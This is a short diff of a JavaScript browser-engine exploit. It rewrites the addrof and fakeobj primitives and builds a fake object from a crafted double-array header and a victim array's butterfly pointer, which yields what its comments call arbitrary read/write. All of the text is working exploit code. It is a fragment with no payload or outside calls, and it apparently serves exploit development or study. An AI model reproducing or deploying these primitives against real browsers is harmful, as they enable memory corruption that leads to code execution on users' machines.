@@ -409,10 +409,10 @@ function iv(x){
             // temporary implementations
             addrof = (val) => {
               b1[0] = val;
-              return float2bigint(a1[offset]);
+              return a1[offset];
             }
             fakeobj = (addr) => {
-              a1[offset] = bigint2float(addr);
+              a1[offset] = addr;
               return b1[0];
             }
             port.postMessage("addrof and fakeobj done");
@@ -445,7 +445,7 @@ var print = (msg) => {
     print("[+] victim @"+addrof(victim));
 
     // craft a fake object to modify victim
-    var flags_double_array = 0x0108200700001000n;
+    var flags_double_array = new Int64("0x0108200700001000").asJSValue();
     var container = {
         header: flags_double_array,
         butterfly: victim
@@ -455,7 +455,7 @@ var print = (msg) => {
     var containerAddr = addrof(container);
     print("[+] container @"+containerAddr);
     // add the offset to let compiler recognize fake structure
-    var hax = fakeobj(containerAddr+0x10n);
+    var hax = fakeobj(containerAddr+16);
     print("got hax obj we now have slighty arb r/w")
     // origButterfly is now based on the offset of **victim** 
     // because it becomes the new butterfly pointer
